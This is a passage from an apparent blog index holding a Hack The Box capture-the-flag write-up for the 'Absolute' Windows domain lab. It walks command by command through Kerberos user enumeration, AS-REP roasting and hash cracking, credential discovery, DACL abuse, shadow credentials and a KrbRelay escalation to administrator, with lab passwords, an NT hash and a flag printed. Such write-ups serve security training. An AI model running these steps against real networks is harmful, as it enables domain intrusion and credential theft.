0w 381437c http://absolute.htb/images/hero_3.jpg 200 GET 0l 0w 407495c http://absolute.htb/images/hero_1.jpg 200 GET 85l 196w 2909c http://absolute.htb/ 403 GET 29l 92w 1233c http://absolute.htb/fonts/ 403 GET 29l 92w 1233c http://absolute.htb/fonts/icomoon/ 301 GET 2l 10w 149c http://absolute.htb/fonts =\u0026gt; http://absolute.htb/fonts/ 301 GET 2l 10w 163c http://absolute.htb/fonts/icomoon/fonts =\u0026gt; http://absolute.htb/fonts/icomoon/fonts/ Foothold I downloaded the hero images Let\u0026rsquo;s run them via exiftool and look for authors └─$ for i in {1..6}; do (exiftool hero_$i.jpg | grep Author | awk \u0026#39;{print $3 \u0026#34; \u0026#34; $4}\u0026#39;); done James Roberts Michael Chaffrey Donald Klay Sarah Osvald Jeffer Robinson Nicole Smith Now, we have a list of users Let\u0026rsquo;s generate a user list └─$ username-anarchy -i usernames \u0026gt; user.list └─$ head user.list james jamesroberts james.roberts jamesrob jamerobe jamesr j.roberts jroberts rjames r.james Let\u0026rsquo;s find valid users └─$ kerbrute userenum --dc dc.absolute.htb -d absolute.htb user.list __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 10/04/23 - Ronnie Flathers @ropnop 2023/10/04 18:47:10 \u0026gt; Using KDC(s): 2023/10/04 18:47:10 \u0026gt; dc.absolute.htb:88 2023/10/04 18:47:10 \u0026gt; [+] VALID USERNAME: j.roberts@absolute.htb 2023/10/04 18:47:10 \u0026gt; [+] VALID USERNAME: m.chaffrey@absolute.htb 2023/10/04 18:47:11 \u0026gt; [+] VALID USERNAME: s.osvald@absolute.htb 2023/10/04 18:47:11 \u0026gt; [+] VALID USERNAME: d.klay@absolute.htb 2023/10/04 18:47:11 \u0026gt; [+] VALID USERNAME: j.robinson@absolute.htb 2023/10/04 18:47:11 \u0026gt; [+] VALID USERNAME: n.smith@absolute.htb 2023/10/04 18:47:12 \u0026gt; Done! Tested 88 usernames (6 valid) in 1.454 seconds Let\u0026rsquo;s see if any of valid users is AS-REP-Roastable └─$ impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile user.list absolute.htb/ Impacket v0.11.0 - Copyright 2023 Fortra [-] User j.roberts doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:496204f8dd4267acdea35229d3482c2d$416205d46cb698bf8c23274bf389333b88833c779b9dccb21a57f67ee21c5433de9a2c5003a187c29cf9288b654bc9f8771439ed11a9dc0b109aa256bdb9321079c91e8650bbe113069a9c5872a735ab7c1f7b6aca81fbb523646dd13d96999acfc814e17a3e6819452e0d9be4f1002a380d172bf2ad4b89218018daeea5112c863742e21e43ff333d70cd58f822126bf95dbcbb08bbfe922a04d74eb6cea046adb1d4a3b54199ae62c48cb76cd0de9626cc3830e229d4fb1fa9a232c80edb402ece738142cc979888523f544b21ec1a0d5e78205866653c167af0da000d2957b17336a23c254e8f7c7413c7 [-] User j.robinson doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Let\u0026rsquo;s crack the hash └─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... $krb5asrep$23$d.klay@ABSOLUTE.HTB:496204f8dd4267acdea35229d3482c2d$416205d46cb698bf8c23274bf389333b88833c779b9dccb21a57f67ee21c5433de9a2c5003a187c29cf9288b654bc9f8771439ed11a9dc0b109aa256bdb9321079c91e8650bbe113069a9c5872a735ab7c1f7b6aca81fbb523646dd13d96999acfc814e17a3e6819452e0d9be4f1002a380d172bf2ad4b89218018daeea5112c863742e21e43ff333d70cd58f822126bf95dbcbb08bbfe922a04d74eb6cea046adb1d4a3b54199ae62c48cb76cd0de9626cc3830e229d4fb1fa9a232c80edb402ece738142cc979888523f544b21ec1a0d5e78205866653c167af0da000d2957b17336a23c254e8f7c7413c7:Darkmoonsky248girl ... Let\u0026rsquo;s test the creds d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION means we have to use -k for Kerberos auth In case you see KRB_AP_ERR_SKEW, just run sudo ntpdate 10.10.11.181, since kerberos requires time sync └─$ crackmapexec smb absolute.htb -u d.klay -p \u0026#39;Darkmoonsky248girl\u0026#39; SMB absolute.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) SMB absolute.htb 445 DC [-] absolute.htb\\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION └─$ crackmapexec smb absolute.htb -u d.klay -p \u0026#39;Darkmoonsky248girl\u0026#39; -k SMB absolute.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) SMB absolute.htb 445 DC [+] absolute.htb\\d.klay:Darkmoonsky248girl User #1 Let\u0026rsquo;s gather domain information └─$ impacket-getTGT absolute.htb/d.klay:\u0026#39;Darkmoonsky248girl\u0026#39; -dc-ip dc.absolute.htb Impacket v0.11.0 - Copyright 2023 Fortra [*] Saving ticket in d.klay.ccache └─$ KRB5CCNAME=d.klay.ccache bloodhound-python -u d.klay -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 -c ALL --zip -k Password: INFO: Found AD domain: absolute.htb INFO: Using TGT from cache INFO: Found TGT with correct principal in ccache file. INFO: Connecting to LDAP server: dc.absolute.htb INFO: Kerberos auth to LDAP failed, trying NTLM ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 52f, v4563 I received an error using bloodhound Let\u0026rsquo;s use ldapsearch But we need a ticket └─$ cat /etc/krb5.conf [libdefaults] default_realm = ABSOLUTE.HTB [realms] ABSOLUTE.HTB = { kdc = 10.10.11.181 } [domain_realm] .absolute.htb = ABSOLUTE.HTB absolute.htb = ABSOLUTE.HTB └─$ kinit d.klay └─$ klist Ticket cache: FILE:/tmp/krb5cc_1000 Default principal: d.klay@ABSOLUTE.HTB Valid starting Expires Service principal 10/05/2023 02:05:40 10/05/2023 06:05:40 krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB renew until 10/05/2023 06:05:40 Now, we run ldapsearch Let\u0026rsquo;s check users Make sure that /etc/hosts has the following entry 10.10.11.181 dc.absolute.htb absolute.htb libsasl2-modules-gssapi-mit is installed We could also run crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users └─$ ldapsearch -H ldap://absolute.htb -Y GSSAPI -b \u0026#34;cn=users,dc=absolute,dc=htb\u0026#34; SASL/GSSAPI authentication started SASL username: d.klay@ABSOLUTE.HTB SASL SSF: 256 SASL data security layer installed. # extended LDIF # # LDAPv3 # base \u0026lt;cn=users,dc=absolute,dc=htb\u0026gt; with scope subtree ... dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: svc_smb description: AbsoluteSMBService123! distinguishedName: CN=svc_smb,CN=Users,DC=absolute,DC=htb instanceType: 4 whenCreated: 20220609082551.0Z whenChanged: 20220822163634.0Z uSNCreated: 16636 memberOf: CN=Protected Users,CN=Users,DC=absolute,DC=htb uSNChanged: 40999 name: svc_smb ... # search result search: 4 result: 0 Success # numResponses: 42 # numEntries: 41 svc_smb looks like has a password in description field svc_smb:AbsoluteSMBService123! The creds are valid └─$ sudo ntpdate 10.10.11.181; crackmapexec smb 10.10.11.181 -u svc_smb -p \u0026#39;AbsoluteSMBService123!\u0026#39; -k 2023-10-05 03:00:19.193039 (+0100) +25157.322135 +/- 0.050155 10.10.11.181 s1 no-leap CLOCK: time stepped by 25157.322135 SMB 10.10.11.181 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) SMB 10.10.11.181 445 DC [+] absolute.htb\\svc_smb:AbsoluteSMBService123! I found a solution for bloodhound issue I had I had to run bloodhound-python with flag -v It showed KRB_AP_ERR_SKEW(Clock skew too great) despite running ntpdate 10.10.11.181 So it happened that after syncing with DC, my box during ldap queries reverted back to initial time Could be due to time-sync with openvpn So I had to perform 2 steps apt install systemd-timesyncd and then timedatectl set-ntp 0 Then we do ntpdate 10.10.11.181 └─$ impacket-getTGT absolute.htb/svc_smb:\u0026#39;AbsoluteSMBService123!\u0026#39; -dc-ip dc.absolute.htb Impacket v0.11.0 - Copyright 2023 Fortra [*] Saving ticket in svc_smb.ccache └─$ KRB5CCNAME=svc_smb.ccache bloodhound-python -u svc_smb -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 -c ALL --zip -k -v Password: DEBUG: Resolved collection methods: trusts, localadmin, psremote, acl, container, session, group, objectprops, dcom, rdp DEBUG: Using DNS to retrieve domain information DEBUG: Querying domain controller information from DNS DEBUG: Using domain hint: absolute.htb INFO: Found AD domain: absolute.htb DEBUG: Found primary DC: dc.absolute.htb DEBUG: Found Global Catalog server: dc.absolute.htb DEBUG: Found KDC for enumeration domain: dc.absolute.htb ... Nothing new in bloodhound Let\u0026rsquo;s check smb with new creds, since name implies it └─$ crackmapexec smb dc.absolute.htb -k -u svc_smb -p \u0026#39;AbsoluteSMBService123!\u0026#39; --shares SMB dc.absolute.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) SMB dc.absolute.htb 445 DC [+] absolute.htb\\svc_smb:AbsoluteSMBService123! SMB dc.absolute.htb 445 DC [+] Enumerated shares SMB dc.absolute.htb 445 DC Share Permissions Remark SMB dc.absolute.htb 445 DC ----- ----------- ------ SMB dc.absolute.htb 445 DC ADMIN$ Remote Admin SMB dc.absolute.htb 445 DC C$ Default share SMB dc.absolute.htb 445 DC IPC$ READ Remote IPC SMB dc.absolute.htb 445 DC NETLOGON READ Logon server share SMB dc.absolute.htb 445 DC Shared READ SMB dc.absolute.htb 445 DC SYSVOL READ Logon server share Let\u0026rsquo;s check Shared We have 2 files, let\u0026rsquo;s download them └─$ impacket-smbclient -k \u0026#39;absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb\u0026#39; -dc-ip 10.10.11.181 Impacket v0.11.0 - Copyright 2023 Fortra Type help for list of commands # use shared # ls drw-rw-rw- 0 Thu Sep 1 18:02:23 2022 . drw-rw-rw- 0 Thu Sep 1 18:02:23 2022 .. -rw-rw-rw- 72 Thu Sep 1 18:02:23 2022 compiler.sh -rw-rw-rw- 67584 Thu Sep 1 18:02:23 2022 test.exe # mget * [*] Downloading compiler.sh [*] Downloading test.exe compiler.sh just compiles the nim program While test.exe is 32-bit windows executable └─$ cat compiler.sh #!/bin/bash nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1 └─$ file test.exe test.exe: PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 11 sections I tried running the executable from my windows host Nothing happened, so I ran wireshark to see if there are any packets First I saw bunch of dns queries _ldap._tcp.dc.absolute.htb: type SRV, class IN So I had to update my hosts file with _ldap._tcp.dc.absolute.htb Now we see bind attempts to LDAP as mlovegod user mlovegod:AbsoluteLDAP2022! But if we check bloodhound there is a m.lovegod user, thus it had typo That\u0026rsquo;s why test.exe couldn\u0026rsquo;t bind using creds └─$ crackmapexec smb 10.10.11.181 -u m.lovegod -p \u0026#39;AbsoluteLDAP2022!\u0026#39; -k SMB 10.10.11.181 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) SMB 10.10.11.181 445 DC [+] absolute.htb\\m.lovegod:AbsoluteLDAP2022! User #2 We have a potential path We own Network Audit group, so we can become members of Network Audit group Then we can create shadow credentials winrm_user https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab I had to download the following branch https://github.com/ShutdownRepo/impacket/tree/dacledit `` └─$ git clone https://github.com/ShutdownRepo/impacket.git Cloning into \u0026#39;impacket\u0026#39;... remote: Enumerating objects: 24084, done. remote: Counting objects: 100% (5020/5020), done. remote: Compressing objects: 100% (523/523), done. remote: Total 24084 (delta 4627), reused 4723 (delta 4497), pack-reused 19064 Receiving objects: 100% (24084/24084), 9.89 MiB | 1.75 MiB/s, done. Resolving deltas: 100% (18308/18308), done. └─$ git branch -a * master remotes/origin/CVE-2021-42278 remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/aclattack remotes/origin/ccache-to-kirbi remotes/origin/dacledit remotes/origin/describeTicket remotes/origin/findDelegation remotes/origin/getST remotes/origin/getST-u2u remotes/origin/getaddescriptions remotes/origin/getuserspns remotes/origin/getuserspns-nopreauth remotes/origin/http-multi-relay remotes/origin/kdctime remotes/origin/master remotes/origin/ndr remotes/origin/ntlmrelayx remotes/origin/owneredit remotes/origin/rbcd remotes/origin/reg-save remotes/origin/relay-user-multi remotes/origin/renameMachine remotes/origin/s4u2-scripts remotes/origin/sapphire-tickets remotes/origin/secretsdump.dcsyncall remotes/origin/shadowcredentials remotes/origin/sidhistory remotes/origin/test-refactor remotes/origin/tgssub remotes/origin/wiki └─$ git checkout -b dacledit remotes/origin/dacledit branch \u0026#39;dacledit\u0026#39; set up to track \u0026#39;origin/dacledit\u0026#39;. Switched to a new branch \u0026#39;dacledit\u0026#39; └─$ git branch * dacledit └─$ pip3 install . Defaulting to user installation because normal site-packages is not writeable Processing /home/Tools/impacket-dacl Preparing metadata (setup.py) ... done ... Now we can use dacledit Let\u0026rsquo;s add WriteMembers permission └─$ KRB5CCNAME=m.lovegod.ccache dacledit.py -k \u0026#39;absolute.htb/m.lovegod:AbsoluteLDAP2022!\u0026#39; -dc-ip dc.absolute.htb -principal m.lovegod -target \u0026#34;Network Audit\u0026#34; -action write -rights WriteMembers Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation [*] DACL backed up to dacledit-20231006-010120.bak [*] DACL modified successfully! Now we add ourselves to Network Audit group └─$ net rpc group members \u0026#34;Network Audit\u0026#34; -U \u0026#39;absolute.htb\\m.lovegod\u0026#39; --use-kerberos=required -S dc.absolute.htb Password for [ABSOLUTE.HTB\\m.lovegod]: absolute\\svc_audit └─$ net rpc group addmem \u0026#34;Network Audit\u0026#34; \u0026#34;m.lovegod\u0026#34; -U \u0026#39;absolute.htb\\m.lovegod\u0026#39; --use-kerberos=required -S dc.absolute.htb Password for [ABSOLUTE.HTB\\m.lovegod]: └─$ net rpc group members \u0026#34;Network Audit\u0026#34; -U \u0026#39;absolute.htb\\m.lovegod\u0026#39; --use-kerberos=required -S dc.absolute.htb Password for [ABSOLUTE.HTB\\m.lovegod]: absolute\\m.lovegod absolute\\svc_audit Now, we can change password or add shadow credentials Let\u0026rsquo;s do the second https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab We need certipy Or via PyWhisker Run it to check if ADCS is installed └─$ KRB5CCNAME=m.lovegod.ccache certipy-ad find -username m.lovegod@absolute.htb -k -target dc.absolute.htb Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;absolute-DC-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;absolute-DC-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;absolute-DC-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for \u0026#39;absolute-DC-CA\u0026#39; [-] Got error: module \u0026#39;enum\u0026#39; has no attribute \u0026#39;_decompose\u0026#39; [-] Use -debug to print a stacktrace Reissue TGT for m.lovegod after adding him to group and then run certipy-ad shadow auto └─$ impacket-getTGT absolute.htb/m.lovegod:\u0026#39;AbsoluteLDAP2022!\u0026#39; -dc-ip dc.absolute.htb Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation [*] Saving ticket in m.lovegod.ccache └─$ KRB5CCNAME=m.lovegod.ccache certipy-ad shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Targeting user \u0026#39;winrm_user\u0026#39; [*] Generating certificate [*] Certificate generated [*] Generating Key Credential [*] Key Credential generated with DeviceID \u0026#39;a1327c0b-fde8-0be2-42dd-d042f9874a21\u0026#39; [*] Adding Key Credential with device ID \u0026#39;a1327c0b-fde8-0be2-42dd-d042f9874a21\u0026#39; to the Key Credentials for \u0026#39;winrm_user\u0026#39; [*] Successfully added Key Credential with device ID \u0026#39;a1327c0b-fde8-0be2-42dd-d042f9874a21\u0026#39; to the Key Credentials for \u0026#39;winrm_user\u0026#39; [*] Authenticating as \u0026#39;winrm_user\u0026#39; with the certificate [*] Using principal: winrm_user@absolute.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;winrm_user.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;winrm_user\u0026#39; [*] Restoring the old Key Credentials for \u0026#39;winrm_user\u0026#39; [*] Successfully restored the old Key Credentials for \u0026#39;winrm_user\u0026#39; [*] NT hash for \u0026#39;winrm_user\u0026#39;: 8738c7413a5da3bc1d083efc0ab06cb2 And we got our shell └─$ KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\winrm_user\\Documents\u0026gt; Root To get a root on this host we have to perform Krbrelay https://github.com/cube0x0/KrbRelay Or https://github.com/Flangvik/SharpCollection For it to work we need: Box shouldn\u0026rsquo;t have Oct 2022 patches and LDAP signing must be disabled (Windows default). Let\u0026rsquo;s start First we need to find the CLSID Version 10.0.17763.3406 Maps to Windows Server 2019 or Windows 10 https://www.gaijin.at/en/infos/windows-version-numbers *Evil-WinRM* PS C:\\Users\\winrm_user\u0026gt; cmd /c ver Microsoft Windows [Version 10.0.17763.3406] From github post we have multiple options Let\u0026rsquo;s start with 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 Now we need to upload our binary *Evil-WinRM* PS C:\\Users\\winrm_user\u0026gt; .\\krbrelay.exe -spn ldap/dc.absolute.htb -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember \u0026#34;Domain Admins\u0026#34; winrm_user [*] Relaying context: absolute.htb\\DC$ [*] Rewriting function table [*] Rewriting PEB [*] GetModuleFileName: System [*] Init com server [*] GetModuleFileName: C:\\Users\\winrm_user\\krbrelay.exe [*] Register com server objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAAdBS8jXo2zSz5zQY7ofyUaAvwAAMgH///LyO5YbeJkjyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==: [*] Forcing SYSTEM authentication [*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 System.Runtime.InteropServices.COMException (0x8000401A): The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A) at KrbRelay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid\u0026amp; pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults) at KrbRelay.Program.Main(String[] args) This error happens since exploit requires interactive session We can use RunasCs Let\u0026rsquo;s upload it and try again CLSIDs from github didn\u0026rsquo;t work So I had to use the one from Trusted Installer here *Evil-WinRM* PS C:\\Users\\winrm_user\\videos\u0026gt; .\\runascs \u0026#39;m.lovegod\u0026#39; \u0026#39;AbsoluteLDAP2022!\u0026#39; -d absolute.htb -l 9 \u0026#34;.\\krbrelay.exe -spn ldap/dc.absolute.htb -port 10 -clsid 752073A1-23F2-4396-85F0-8FDB879ED0ED -add-groupmember Administrators winrm_user\u0026#34; [*] Relaying context: absolute.htb\\DC$ [*] Rewriting function table [*] Rewriting PEB [*] GetModuleFileName: System [*] Init com server [*] GetModuleFileName: C:\\Users\\winrm_user\\videos\\krbrelay.exe [*] Register com server objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABN8Q56HFqFMWQEVafX0mq9ApAAAOQK//+ZS0h01jPZgCIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==: [*] Forcing SYSTEM authentication [*] Using CLSID: 752073a1-23f2-4396-85f0-8fdb879ed0ed [*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a04820486dd1ef9546a93d733e8e8a66a37c865602589f3faa090c2a636fd7743b625e2545b3809b779cfc7327a690a3d6f2ac25725e38d3f3798af94af9efcfc314ff04bdde1e30cb44bb166ac96c5791a6ff1f274474bdfa9bae2a4d471d3e779c8bda549fa6922eacf17e978d686583ae628af7550fed20def8035cea50972ea34863b70afab78fa67823011e1480f01ffcc5724e09843aee634c82fcfa3b87702827a738cd5ff49b8e481ed966224779427dddc278487a6a32410c666ee55110685430284f24f6f27c1e6044d73874e9354d1eb8f501425eadde404ec756d6483df05e08c11ac603b8f57a4dd42556c1f670e0312e9041be0b55bb47022f704cf9534cff788ee66093a5644f0315fbc4870f31ded37e2ac19c15b0ac10ff66aa1fc053a243308bcf218d49de12b4cefe92d4aa98c67183f52b436a8cc9a83b434077a9a0bfcc39be15b05103c2cb397b04174e38c899c606ab52e475ab1f97924f0e3316978036885cc48f4216b8d5b1be67ccf2acdca9bb3662effbebf5e6285048b669f46dfee09d74f6509b5ff7e473581b9dc4907eb5eff663b7a8321b0e41579e6316a5b6cf30823b7fb652d1ff9968538ac92381355b99ad2d483ad4a8528b28e851658517ed73a460178b55ba5514c3296aa2b38461aaf4295a0fbd868e99db941a49a51b19abd061a47e58a59dcce6fcc37509258295effcaceebd784689f6120504204a89532b73cae3ddb5b99a4a0a60c6759ab1effca1b2cd74165ac13eb9ef15bef84211761567caac850f3319ccc240cc10801f8aebf2f996cd603ba63a01d9c66ee9c1603125d30370744344d259779855fc0e844b0cb7ad45603c159a5f98f94c51832edd9a542bafd00e770643391848f945918fe7db30584797272caa420f2861c0386dad6b5f80108050d6053b3f83a0631b9b96e72c3e0cc686606756145821e62e1a70a7cc149ca97530d329f69603adff00d8f8c1c8c4aa1829ca566e23579502d415f9dfca75b2100e1f71cd223697188d48f807d60ff0e5b5c9fb9a2042124368b781fe51293b351ecf04009eabb208664ab40cce3c211f01ef19a41606368f6369a3219c90d5d3762d2d5eb6cc42bc58e7efba545b776aa024fa24d331f1da55057d794a0a1305d14386c50427b93ac292258ee4c1a525cad4f5a1234516281841c375dd4c1b7d9b614d43fb29724e31802e9ae4d9c4fa48aa165f98842774c1c113e220d82c452bd7708c25283a3a7f16e63dd28a2fcf374bfe68392a7e5f1b1dd092e78cfb0d96feb1255dc1a92c223139bed9b18f080a7abbb85b23bc8a110d51d138d74f8d751244acf2b12cbc00cf40aba6a3dfb652daffca3cceb3b600205b012e08b24ba184dccb8518a8499e30412a3b09c684a0775e37e0d2beafa1ebedc481b7a54fcf933eeb7bba35ed72f87ddc0cf7ccaa6d3487c1876d282877046c8f93f9cbc5fd17d342d623ec340a1bae69c106c13413b942d24ffbb8c2faec41e08d4e8b41b00a0de97a5c9d152b60819c19110e1fe2ce4eb63e743e06068c3ac25e118e77bb579a5b0534861c36f49ef8fc9e568d5a70c8f71286b68136e738840c3b0a64e0e4991c18153040ee59f6f64c8711cdf4edb6ddffea48201a33082019fa003020112a28201960482019297eb3b63d07a774b625c14afeed6e50f363424278417fb80eecb573ff7f0eb1c4a863d2027947e14d747f6b7d16d09dd22c1835fa6457834b9ca05af59032050aee01eddcf92ecffcc50379f2398514fd3521163a8abf21232efc665d471ecb00213d31027e0928fd8118071b6e9ac583ba16b46e219c9dd62d845ecee8007d8d31fdcff9fd1029a3033b3c3a8a4b179204f5d7c57d09c71ffb464154d231584f0172cea17e19d50bf7bd392bb6c79cd638e0b5ccd6a209ba3337f2b62f440a9f478f548305050506929c5ff6151eea0ea056eaf8d29aaab309137d12c14aa8e74ecf7ada5e6a763ff7549ad18b20d870ba5fc40befc1aac1e7e6c869b9716e8d8de432ed475cc03bcf0cad8fc4f4f5ee025a158811681b5a7bc345ee4bb3959636d55026a08becc0587027f9aa3a954d98161270b7f5b32dc8d43d4be3a53b0f954560784733b5d5d45449187b82dd9d7563638efd9807306a84c892041d3a61419933be6c13e48b816ab3823913667eb3b7dc4cb20059c585f1e715fb40b6b4afb3fd95f5aef296ac1d97fa4ee20b0814a [*] bind: 0 [*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS [*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046ed4469a847818a0605964ac264f21643f3c097498327e65e0f20ee0d7dd22a54cdc52c695c51f4179a7b879eb69009a3273a95a62d8a40e8810f0c0e8852278426a30e446d71d087433a8c0b278d54ca3061f2419fb915f251a8e438a29e96e6febd5745414af79e2ae8a6d17a958 [*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED [*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection [*] apRep2: 6f5a3058a003020105a10302010fa24c304aa003020112a243044149daf20b987c4ac02e0c59b6b1739984a3c690c5ee80b872b91edc460d6ed273a7f09ca82bb458ac073000cd4c87168e33937cbbff1693a0b76659ded5a07d2a48 [*] bind: 0 [*] ldap_get_option: LDAP_SUCCESS [+] LDAP session established [*] ldap_modify: LDAP_SUCCESS *Evil-WinRM* PS C:\\Users\\winrm_user\\videos\u0026gt; net user winrm_user User name winrm_user Full Name Comment Used to perform simple network tasks User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 6/9/2022 1:25:51 AM Password expires Never Password changeable 6/10/2022 1:25:51 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 10/5/2023 5:13:12 PM Logon hours allowed All Local Group Memberships *Administrators *Remote Management Use Global Group memberships *Domain Users *Protected Users The command completed successfully. Now relogin to get a flag *Evil-WinRM* PS C:\\Users\\winrm_user\\Documents\u0026gt; cd \\users\\administrator\\desktop *Evil-WinRM* PS C:\\users\\administrator\\desktop\u0026gt; type root.txt 0c8f8798e8846080d4b22ea7e77fcfdd *Evil-WinRM* PS C:\\users\\administrator\\desktop\u0026gt; We can also try KrbRelayUp ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/absolute/images/absolute.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/","summary":"Absolute Enumeration nmap └─$ nmap -Pn -p- 10.10.11.181 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:44 BST Nmap scan report for 10.10.11.181 (10.10.11.181) Host is up (0.10s latency). Not shown: 65509 closed ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49686/tcp open unknown 49692/tcp open unknown 49699/tcp open unknown 49703/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.","tags":["HTB","iis","crackmapexec","ldapsearch","dnsenum","feroxbuster","exiftool","username-anarchy","kerbrute","as-rep-roast","hashcat","kerberos","kinit","klist","bloodhound","bloudhound-python","rpc","dynamic-reversing","wireshark","shadow-credential","certipy","krbrelay","runascs","krbrelayup","rubeus","dcsync"],"title":"[HTB] Machine: Absolute"},{"categories":null,"contents":"Anubis Enumeration nmap └─$ nmap -Pn -p- 10.10.11.102 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 18:21 BST Nmap scan report for 10.10.11.102 (10.10.11.102) Host is up (0.10s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 135/tcp open msrpc 443/tcp open https 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 49707/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 26.08 seconds └─$ 